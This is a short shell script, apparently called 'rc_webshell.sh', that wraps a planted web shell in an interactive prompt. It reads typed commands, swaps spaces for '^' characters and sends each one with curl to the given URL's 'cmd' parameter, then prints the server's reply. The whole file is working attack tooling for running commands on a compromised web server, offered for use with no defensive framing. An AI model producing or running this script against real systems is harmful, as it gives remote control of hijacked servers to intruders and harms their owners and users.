#! /bin/sh

# author: Nullable

usage() {
	echo "\nUsage: rc_webshell.sh <url_to_webshell>"
	exit
}

main() {
	if test $# -ne 1; then
		usage
	fi
	
	while true; do
		echo -n "$ "
		read command
		command=$(echo $command | tr " " "^")
		echo $(curl -s "$1?cmd=$command")
	done
}

main $@
